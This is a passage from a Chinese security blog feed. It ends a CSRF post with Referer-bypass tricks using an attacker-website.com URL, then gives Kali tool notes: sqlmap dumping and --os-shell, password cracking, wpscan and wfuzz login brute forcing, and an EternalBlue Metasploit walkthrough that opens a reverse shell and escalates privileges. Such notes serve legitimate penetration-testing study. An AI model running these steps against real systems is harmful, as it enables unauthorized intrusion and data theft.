<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COFFEESCRIPT"><figure class="iseeu highlight /coffeescript"><table><tr><td class="code"><pre><span class="line">window.onclick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    window.open(<span class="string">&#x27;https://vulnerable-website.com/login/sso&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这样，仅当用户点击页面上的某个位置时，才会调用 window.open() 方法。</p>
<h3 id="基于-Referer-的验证"><a href="#基于-Referer-的验证" class="headerlink" title="基于 Referer 的验证"></a>基于 Referer 的验证</h3><p>一些应用程序利用 HTTP Referer 标头来尝试防御 CSRF 攻击，通常是通过验证请求是否来自应用程序自己的域。这通常比 CSRF tokens验证效果差。</p>
<p>HTTP Referer 标头是一个可选的请求标头，其中包含链接到所请求资源的网页的 URL。它通常在用户触发 HTTP 请求时由浏览器自动添加，包括通过点击链接或提交表单。存在各种方法允许链接页面保留或修改 Referer 标头的值。这通常是出于隐私原因。</p>
<ul>
<li>当请求中存在 Referer 标头时，某些应用程序会验证该标头，但如果省略该标头，则会跳过验证。在这种情况下，攻击者可以精心设计 CSRF 漏洞，让受害用户的浏览器在生成的请求中丢弃 Referer 标头。有多种方法可以实现此目的，但最简单的方法是在承载 CSRF 攻击的 HTML 页面中使用 META 标记：</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;never&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>某些应用程序以一种可以被绕过的简单方式验证 Referer 标头。例如，如果应用程序验证 Referer 中的域以预期值开头，则攻击者可以将其作为自己域的子域：</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//attacker-website.com/csrf-attack?vulnerable-website.com</span></span><br></pre></td></tr></table></figure></div>
<p>虽然 可以使用 Burp 识别此行为，但当 在浏览器中测试概念验证时， 经常会发现这种方法不再有效。为了降低以这种方式泄露敏感数据的风险，许多浏览器现在默认从 Referer 标头中删除查询字符串。</p>
<p>因为许多浏览器现在默认从 Referer 标头中删除查询字符串作为安全措施。要覆盖此行为并确保请求中包含完整的 URL，请返回漏洞服务器并将以下标头添加到 “Head” 部分：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CMAKE"><figure class="iseeu highlight /cmake"><table><tr><td class="code"><pre><span class="line">Referrer-<span class="keyword">Policy</span>: unsafe-url</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>漏洞</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>笔记</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具笔记</title>
    <url>/posts/15173.html</url>
    <content><![CDATA[<p>kali工具笔记</p>
<span id="more"></span>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>Nmap 是一个强大的端口扫描工具，默认扫描端口范围 1-1024。</p>
<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>-sn</code> 或 <code>-sP</code></td>
<td>进行主机探测（Ping 扫描）。</td>
</tr>
<tr>
<td>无参数</td>
<td>更详细的扫描，可以获取端口信息。</td>
</tr>
<tr>
<td><code>-p-</code></td>
<td>扫描所有端口（有时 Ping 不一定能扫出）。</td>
</tr>
<tr>
<td><code>-p &lt;端口&gt;</code></td>
<td>指定端口扫描，可与 <code>--script=banner</code> 或 <code>-A</code> 结合使用。</td>
</tr>
<tr>
<td><code>-sU</code></td>
<td>扫描 UDP 端口，探测目标上的服务。</td>
</tr>
<tr>
<td><code>-A</code></td>
<td>启用高级检测，包括操作系统检测、版本检测、脚本扫描和路由跟踪。</td>
</tr>
<tr>
<td><code>-sS</code></td>
<td>进行半开放式（SYN）扫描，适用于快速端口扫描。</td>
</tr>
<tr>
<td><code>-sT</code></td>
<td>进行完整连接（TCP 连接）扫描，适用于没有特权的用户。</td>
</tr>
<tr>
<td><code>-sV</code></td>
<td>探测端口服务版本信息。</td>
</tr>
<tr>
<td><code>-O</code></td>
<td>进行操作系统检测。</td>
</tr>
<tr>
<td><code>--script=&lt;脚本&gt;</code></td>
<td>使用 Nmap 脚本引擎（NSE），如 <code>--script=vuln</code> 进行漏洞扫描。</td>
</tr>
<tr>
<td><code>-T&lt;0-5&gt;</code></td>
<td>设置扫描速度，<code>T0</code> 最慢，<code>T5</code> 最快。</td>
</tr>
<tr>
<td><code>-Pn</code></td>
<td>跳过 Ping 检测，直接扫描目标主机（适用于防火墙屏蔽 Ping 的情况）。</td>
</tr>
</tbody></table>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>SQLMap 是一个自动化 SQL 注入漏洞检测工具</p>
<h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>-u &lt;URL&gt;</code></td>
<td>指定目标 URL，例如 <code>-u &quot;http://example.com?id=1&quot;</code>。</td>
</tr>
<tr>
<td><code>--data &quot;&lt;参数&gt;&quot;</code></td>
<td>用于 POST 请求的参数数据，例如 <code>--data &quot;user=admin&amp;pass=123&quot;</code>。</td>
</tr>
<tr>
<td><code>--cookie &quot;&lt;cookie&gt;&quot;</code></td>
<td>指定请求的 Cookie，例如 <code>--cookie &quot;PHPSESSID=12345&quot;</code>。</td>
</tr>
<tr>
<td><code>-p &lt;参数&gt;</code></td>
<td>指定测试的参数，例如 <code>-p id</code> 只测试 <code>id</code> 参数。</td>
</tr>
<tr>
<td><code>--level=&lt;1-5&gt;</code></td>
<td>设置测试强度，默认 <code>1</code>，<code>5</code> 最彻底但较慢。</td>
</tr>
<tr>
<td><code>--risk=&lt;1-3&gt;</code></td>
<td>设置风险级别，<code>1</code> 为低，<code>3</code> 为高。</td>
</tr>
<tr>
<td><code>--dbs</code></td>
<td>枚举目标数据库名称。</td>
</tr>
<tr>
<td><code>--tables</code></td>
<td>列出目标数据库中的表，需要结合 <code>-D &lt;数据库名&gt;</code> 使用。</td>
</tr>
<tr>
<td><code>--columns</code></td>
<td>列出表中的列名，需要结合 <code>-D &lt;数据库名&gt; -T &lt;表名&gt;</code> 使用。</td>
</tr>
<tr>
<td><code>--dump</code></td>
<td>导出表中的数据，需要结合 <code>-D &lt;数据库名&gt; -T &lt;表名&gt;</code> 使用。</td>
</tr>
<tr>
<td><code>--batch</code></td>
<td>跳过交互提示，自动选择默认选项，适用于脚本化操作。</td>
</tr>
<tr>
<td><code>--threads &lt;N&gt;</code></td>
<td>设置扫描线程数，提高扫描速度（默认为 <code>1</code>，建议 <code>3-5</code>）。</td>
</tr>
<tr>
<td><code>--os-shell</code></td>
<td>获取操作系统 Shell（如果目标数据库具有命令执行权限）。</td>
</tr>
<tr>
<td><code>--tamper &lt;脚本&gt;</code></td>
<td>使用 <code>tamper</code> 脚本（如 <code>--tamper=space2comment</code>）绕过某些安全防护。</td>
</tr>
</tbody></table>
<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> <span class="comment">--dbs</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db <span class="comment">--tables</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db -T users <span class="comment">--columns</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db -T users -C xxxx <span class="comment">--dump</span></span><br></pre></td></tr></table></figure></div>
<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><p>在 Kali Linux 中，<strong>John the Ripper</strong> 是一个强大的密码破解工具，用于测试密码强度</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">john [选项] <span class="tag">&lt;<span class="name">文件</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>–wordlist&#x3D;&lt;文件&gt;：指定密码字典。<br>默认字典位置：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<br>破解结果存储在 ~&#x2F;.john&#x2F;john.pot。</p>
<h3 id="常用参数-2"><a href="#常用参数-2" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>--wordlist=&lt;文件&gt;</code></td>
<td>使用指定的密码字典进行破解。</td>
</tr>
<tr>
<td><code>--rules</code></td>
<td>启用规则扩展（对字典进行变形，提高成功率）。</td>
</tr>
<tr>
<td><code>--format=&lt;格式&gt;</code></td>
<td>指定哈希格式，如 <code>md5crypt</code>、<code>sha512crypt</code>、<code>nt</code>、<code>zip</code>。</td>
</tr>
<tr>
<td><code>--show</code></td>
<td>显示已破解的密码。</td>
</tr>
<tr>
<td><code>--incremental</code></td>
<td>使用增量模式（自动生成候选密码）。</td>
</tr>
<tr>
<td><code>--session=&lt;名称&gt;</code></td>
<td>指定会话名称，可暂停后续继续破解。</td>
</tr>
<tr>
<td><code>--restore=&lt;名称&gt;</code></td>
<td>恢复指定会话的破解进度。</td>
</tr>
<tr>
<td><code>--fork=&lt;N&gt;</code></td>
<td>启用 <code>N</code> 个进程进行并行破解，提高速度。</td>
</tr>
<tr>
<td><code>--single</code></td>
<td>使用用户名作为密码的基础进行单模式破解。</td>
</tr>
<tr>
<td><code>--stdout</code></td>
<td>仅生成候选密码，不进行破解（测试字典效果）。</td>
</tr>
</tbody></table>
<h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">john <span class="attribute">--wordlist</span>=rockyou.txt <span class="attribute">--format</span>=raw-md5 hashes.txt</span><br></pre></td></tr></table></figure></div>

<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><p><strong>WPScan</strong> 是一个专注于 WordPress 安全性的开源工具，用于扫描 WordPress 网站的安全漏洞。它可以帮助管理员识别网站中可能存在的安全问题，例如已知的插件或主题漏洞、弱密码、以及错误的配置</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> &lt;target_url&gt; <span class="selector-attr">[选项]</span></span><br></pre></td></tr></table></figure></div>
<p>现在都需要到官网注册 然后得到api-token 才能获得扫描之后的详细结果</p>
<h3 id="常用参数-3"><a href="#常用参数-3" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>--url &lt;URL&gt;</code></td>
<td>指定目标网站的 URL。</td>
</tr>
<tr>
<td><code>--enumerate &lt;OPTION&gt;</code></td>
<td>枚举 WordPress 的用户、插件、主题等（详细选项见下方）。</td>
</tr>
<tr>
<td><code>--api-token &lt;TOKEN&gt;</code></td>
<td>使用 WPScan API Token 获取更详细的漏洞数据。</td>
</tr>
<tr>
<td><code>--random-user-agent</code></td>
<td>使用随机的 User-Agent 模拟真实用户访问，避免被目标网站屏蔽。</td>
</tr>
<tr>
<td><code>--passwords &lt;FILE&gt;</code></td>
<td>指定密码字典文件，用于密码暴力破解。</td>
</tr>
<tr>
<td><code>--usernames &lt;FILE&gt;</code></td>
<td>指定用户名字典文件，用于密码暴力破解。</td>
</tr>
<tr>
<td><code>--ignore-main-redirect</code></td>
<td>忽略网站的 URL 重定向。</td>
</tr>
<tr>
<td><code>--verbose</code></td>
<td>显示详细的输出信息。</td>
</tr>
</tbody></table>
<p>通过 <code>--enumerate</code> 参数，可以枚举 WordPress 网站的不同组件：</p>
<table>
<thead>
<tr>
<th>枚举选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>u</code></td>
<td>枚举用户（尝试查找用户名）。</td>
</tr>
<tr>
<td><code>p</code></td>
<td>枚举插件及其漏洞信息。</td>
</tr>
<tr>
<td><code>t</code></td>
<td>枚举主题及其漏洞信息。</td>
</tr>
<tr>
<td><code>vp</code></td>
<td>枚举有漏洞的插件（需要 API 支持）。</td>
</tr>
<tr>
<td><code>vt</code></td>
<td>枚举有漏洞的主题（需要 API 支持）。</td>
</tr>
<tr>
<td><code>ap</code></td>
<td>显示所有插件。</td>
</tr>
<tr>
<td><code>at</code></td>
<td>显示所有主题。</td>
</tr>
</tbody></table>
<p>密码破解</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">wpscan <span class="params">--url</span> https:<span class="string">//example.com</span> -P passwords.txt -U users.txt</span><br></pre></td></tr></table></figure>
<h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><p><strong>WFuzz</strong> 是一款开源的 Web 应用模糊测试工具，专为渗透测试设计。它的主要功能是通过暴力破解和模糊测试技术，枚举和发现 Web 应用中的隐藏内容或漏洞，比如：</p>
<ol>
<li><strong>目录和文件枚举</strong>：发现网站的隐藏目录或敏感文件。</li>
<li><strong>参数枚举</strong>：测试 Web 应用中可能存在的隐藏参数。</li>
<li><strong>凭据爆破</strong>：用于暴力破解登录页面。</li>
<li><strong>漏洞检测</strong>：检测 SQL 注入、XSS、命令注入等安全漏洞。</li>
<li><strong>HTTP 请求自定义</strong>：允许用户灵活自定义 HTTP 请求，实现高级模糊测试。<br><strong><code>-u/--url</code></strong>   指定目标 URL，并在其中插入 <code>FUZZ</code> 占位符，WFuzz 会用字典内容替换 <code>FUZZ</code> 进行请求。<br><code>wfuzz -u http://example.com/FUZZ</code><br>默认自带呢位置在<code>/usr/share/wfuzz/wordlist  </code><br>参数枚举的字典用<code>/usr/share/seclists/Discovery/Web-Content/common.txt</code></li>
</ol>
<h3 id="常见的-z-选项："><a href="#常见的-z-选项：" class="headerlink" title="常见的 -z 选项："></a>常见的 <code>-z</code> 选项：</h3><table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>file,文件路径</code></td>
<td>从字典文件加载数据</td>
</tr>
<tr>
<td><code>range,1-100</code></td>
<td>生成 1 到 100 的数字进行测试</td>
</tr>
<tr>
<td><code>hex,4</code></td>
<td>生成 4 位的十六进制数</td>
</tr>
<tr>
<td><code>alphanum,6</code></td>
<td>生成 6 位的字母 + 数字字符串</td>
</tr>
<tr>
<td><code>random,10</code></td>
<td>生成 10 位随机字符</td>
</tr>
</tbody></table>
<h3 id="过滤无效响应"><a href="#过滤无效响应" class="headerlink" title="过滤无效响应"></a><strong>过滤无效响应</strong></h3><p><code>WFuzz</code> 可能会返回大量无效的 404 响应，可以使用以下参数进行过滤：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>--hc 404</code></td>
<td>隐藏 HTTP 状态码为 404 的响应</td>
</tr>
<tr>
<td><code>--hl 10</code></td>
<td>隐藏行数等于 10 的响应</td>
</tr>
<tr>
<td><code>--hw 5</code></td>
<td>隐藏单词数等于 5 的响应</td>
</tr>
<tr>
<td><code>--hh 200</code></td>
<td>隐藏字节数等于 200 的响应</td>
</tr>
<tr>
<td>（看过的一个用法是 –hc 404 –hl 3 –hw 1</td>
<td></td>
</tr>
<tr>
<td><code>-d</code> 可以同时多个FUZZ位置</td>
<td></td>
</tr>
</tbody></table>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,users.txt -z file,passwords.txt -d <span class="string">&quot;username=FUZZ&amp;password=FUZ2Z&quot;</span> <span class="string">&#x27;http://example.com/login&#x27;</span></span><br><span class="line"><span class="comment">#带上cookie</span></span><br><span class="line">wfuzz -w <span class="regexp">/usr/</span>share<span class="regexp">/seclists/</span>Discovery<span class="regexp">/Web-Content/</span>common.txt -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">240.230</span>/history.php?FUZZ=kakeru -H <span class="string">&#x27;Cookie: PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&#x27;</span> --hh <span class="number">0</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line">选项：</span><br><span class="line"></span><br><span class="line"><span class="deletion">-h/--help：帮助</span></span><br><span class="line"><span class="deletion">--help：高级帮助</span></span><br><span class="line"><span class="deletion">--filter-help：筛选器帮助</span></span><br><span class="line"><span class="deletion">--version：Wfuzz版本详细信息</span></span><br><span class="line"><span class="deletion">-e＜type＞：可用编码器/有效负载/迭代器/打印机/脚本列表</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">--recipe＜filename＞：从配方中读取选项。对各种食谱重复上述步骤。</span></span><br><span class="line"><span class="deletion">--dump recipe＜filename＞：将当前选项打印为配方</span></span><br><span class="line"><span class="deletion">--oF＜filename＞：将模糊结果保存到文件中。这些可以稍后使用wfuzz有效负载来使用。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-c：带颜色的输出</span></span><br><span class="line"><span class="deletion">-v：详细信息。</span></span><br><span class="line"><span class="deletion">-f filename，printer：使用指定的打印机（如果省略了原始打印机）将结果存储在输出文件中。</span></span><br><span class="line"><span class="deletion">-o printer：使用指定的打印机显示结果。</span></span><br><span class="line"><span class="deletion">--interact:（beta）如果选中，则捕获所有按键。这允许您与程序交互。</span></span><br><span class="line"><span class="deletion">--dry-run：打印应用请求的结果，而不实际发出任何HTTP请求。</span></span><br><span class="line"><span class="deletion">--prev：打印以前的HTTP请求（仅当使用生成模糊结果的有效负载时）</span></span><br><span class="line"><span class="deletion">--efield＜expr＞：显示指定的语言表达式以及当前负载。对各个字段重复上述操作。</span></span><br><span class="line"><span class="deletion">--field＜expr＞：不显示有效负载，只显示指定的语言表达式。对各个字段重复上述操作。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-p addr：使用ip:port:type格式的代理。重复使用各种代理的选项。如果省略，类型可以是SOCKS4、SOCKS5或HTTP。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-t N：指定并发连接数（默认值为10）</span></span><br><span class="line"><span class="deletion">-s N：指定请求之间的时间延迟（默认值为0）</span></span><br><span class="line"><span class="deletion">-R depth：递归路径发现深度是最大递归级别。</span></span><br><span class="line"><span class="deletion">-D depth：最大链接深度级别。</span></span><br><span class="line"><span class="deletion">-L, --follow:遵循HTTP重定向</span></span><br><span class="line"><span class="deletion">--ip-host:port：以ip:port格式指定要连接的ip，而不是URL的主机</span></span><br><span class="line"><span class="deletion">-Z：扫描模式（将忽略连接错误）。</span></span><br><span class="line"><span class="deletion">--req delay N：设置请求允许的最长时间（以秒为单位）（CURLOPT_TIMEOUT）。默认值90。</span></span><br><span class="line"><span class="deletion">--conn-delay N：设置服务器连接阶段要花费的最长时间（以秒为单位）（CURLOPT_CONNECTTIMEOUT）。默认值90。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-A, --AA, --AAA: --script=default，verbose，discovery-v-c的别名</span></span><br><span class="line"><span class="deletion">--no-cache：禁用插件缓存。将扫描每个请求。</span></span><br><span class="line"><span class="deletion">--script=：相当于--script=默认值</span></span><br><span class="line"><span class="deletion">--script=&lt;plugins&gt;：运行脚本的扫描&lt;plugins&gt;是以逗号分隔的插件文件或插件类别列表</span></span><br><span class="line"><span class="deletion">--script help=&lt;plugins&gt;：显示有关脚本的帮助。</span></span><br><span class="line"><span class="deletion">--script-args n1=v1，…：为脚本提供参数。即--script args grep.regex=“&lt;A href=\”（.*？）\“&gt;”</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-u url：指定请求的url。</span></span><br><span class="line"><span class="deletion">-m iterator：指定用于组合有效载荷的迭代器（默认为product）</span></span><br><span class="line"><span class="deletion">-z payload：以名称[，参数][，编码器]的形式为每个FUZZ关键字指定有效负载。可以使用编码器列表，即md5-sha1。编码器可以是链式的，即。md5@sha1.可以使用编码器类别。即url</span></span><br><span class="line">使用帮助作为有效负载来显示有效负载插件的详细信息（您可以使用--slice进行过滤）</span><br><span class="line"></span><br><span class="line"><span class="deletion">--zP＜params＞：指定有效负载的参数（必须以-z或-w开头）。</span></span><br><span class="line"><span class="deletion">--zD&lt;default&gt;：指定有效负载的默认参数（必须以-z或-w开头）。</span></span><br><span class="line"><span class="deletion">--zE＜encoder＞：指定有效负载的编码器（它必须以-z或-w开头）。</span></span><br><span class="line"><span class="deletion">--slice＜filter＞：使用指定的表达式过滤有效负载的元素。它必须以-z开头。</span></span><br><span class="line"><span class="deletion">-w wordlist：指定wordlist文件（-z文件的别名，wordlist）。</span></span><br><span class="line"><span class="deletion">-V alltype：所有参数brutforming（allvars和allpost）。不需要FUZZ关键字。</span></span><br><span class="line"><span class="deletion">-X method：指定请求的HTTP方法，即HEAD或FUZZ</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-b cookie：为请求指定cookie。对各种cookie重复选项。</span></span><br><span class="line"><span class="deletion">-d postdata：使用postdata（例如：“id=FUZZ&amp;catalog=1”）</span></span><br><span class="line"><span class="deletion">-H header：使用header（例如：“Cookie:id=1312321&amp;user=FUZZ”）。对各种标题重复选项。</span></span><br><span class="line"><span class="deletion">--basic/ntlm/digest auth：格式为“user:pass”或“FUZZ:FUZZ”或</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">--hc/hl/hw/hh N[，N]+：隐藏具有指定代码/行/字/字符的响应（使用BBB从基线获取值）</span></span><br><span class="line"><span class="deletion">--sc/sl/sw/sh N[，N]+：显示具有指定代码/行/字/字符的响应（使用BBB获取基线值）</span></span><br><span class="line"><span class="deletion">--ss/hs正则表达式：显示/隐藏内容中具有指定正则表达式的响应</span></span><br><span class="line"><span class="deletion">--filter＜filter＞：使用指定的筛选器表达式显示/隐藏响应（使用BBB从基线获取值）</span></span><br><span class="line"><span class="deletion">--prefilter＜filter＞：使用指定的表达式在模糊化之前过滤项目。对串联过滤器重复上述步骤。</span></span><br></pre></td></tr></table></figure></div>

<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>Binwalk 是一个用于分析文件的工具，常用于隐写分析。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">binwalk -e &lt;文件&gt; <span class="attribute">--run-as</span>=root</span><br></pre></td></tr></table></figure></div>

<h2 id="Dos2Unix"><a href="#Dos2Unix" class="headerlink" title="Dos2Unix"></a>Dos2Unix</h2><p>用于将 Windows 文本文件转换为 Unix 格式。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">dos2unix <span class="tag">&lt;<span class="name">文件</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="SearchSploit"><a href="#SearchSploit" class="headerlink" title="SearchSploit"></a>SearchSploit</h2><p>SearchSploit 用于搜索 Exploit-DB 漏洞利用代码。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">searchsploit <span class="tag">&lt;<span class="name">漏洞或软件名</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>漏洞利用文件存放目录：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits</span><br></pre></td></tr></table></figure></div>

<h2 id="Metasploit-msfconsole"><a href="#Metasploit-msfconsole" class="headerlink" title="Metasploit (msfconsole)"></a>Metasploit (msfconsole)</h2><p><code>msfconsole</code> 是 <strong>Metasploit Framework</strong> 的命令行界面，Metasploit 是一个用于开发和执行漏洞利用代码的开源工具。它广泛用于渗透测试、安全评估以及漏洞分析。<code>msfconsole</code> 提供了一个强大的命令行环境，允许用户快速访问各种安全测试功能。<br>以下是一些常见的命令及其说明：</p>
<h3 id="常用参数-4"><a href="#常用参数-4" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>show</code></td>
<td>列出可用的 payloads&#x2F;exploits。</td>
</tr>
<tr>
<td><code>set &lt;选项&gt;</code></td>
<td>设置攻击参数。</td>
</tr>
<tr>
<td><code>unset &lt;选项&gt;</code></td>
<td>取消选项设置。</td>
</tr>
<tr>
<td><code>exploit</code></td>
<td>运行漏洞利用。</td>
</tr>
<tr>
<td><code>sessions</code></td>
<td>管理会话。</td>
</tr>
<tr>
<td><code>info</code></td>
<td>查看模块详细信息。</td>
</tr>
<tr>
<td><code>search &lt;名称&gt;</code></td>
<td>搜索漏洞。</td>
</tr>
<tr>
<td><code>use &lt;模块&gt;</code></td>
<td>选择漏洞模块。</td>
</tr>
<tr>
<td><code>db_nmap</code></td>
<td>运行 Nmap 并保存结果。</td>
</tr>
<tr>
<td><code>exit</code> 或 <code>quit</code></td>
<td>退出 Metasploit。</td>
</tr>
</tbody></table>
<h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 启动 Metasploit</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 搜索漏洞</span></span><br><span class="line">search smb</span><br><span class="line"><span class="comment"># 该命令搜索与 SMB 相关的漏洞利用模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 选择漏洞模块</span></span><br><span class="line">use exploit<span class="regexp">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># 选择 EternalBlue（MS17-010）漏洞利用模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 查看模块详细信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment"># 显示当前模块的详细说明和可用选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 设置攻击目标</span></span><br><span class="line">set RHOSTS <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"><span class="comment"># 目标 IP 地址</span></span><br><span class="line"></span><br><span class="line">set RPORT <span class="number">445</span></span><br><span class="line"><span class="comment"># 选择目标端口 445（SMB 端口）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 设置本地攻击机的回连（反向 shell）</span></span><br><span class="line">set LHOST <span class="number">192.168</span>.<span class="number">1.50</span></span><br><span class="line"><span class="comment"># 设置攻击者的 LHOST</span></span><br><span class="line"></span><br><span class="line">set LPORT <span class="number">4444</span></span><br><span class="line"><span class="comment"># 选择本地监听端口 4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 运行漏洞利用</span></span><br><span class="line">exploit</span><br><span class="line"><span class="comment"># 启动漏洞攻击，如果成功，则会获得目标主机的 meterpreter shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 监听和管理会话</span></span><br><span class="line">sessions -l</span><br><span class="line"><span class="comment"># 列出当前活跃的会话</span></span><br><span class="line"></span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line"><span class="comment"># 进入 ID 为 1 的会话</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. 获取系统权限</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment"># 尝试提升权限到 SYSTEM 级别</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. 获取目标系统信息</span></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 查看目标系统信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. 获取目标主机的 Shell</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 进入目标系统的命令行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12. 运行 Nmap 并保存扫描结果</span></span><br><span 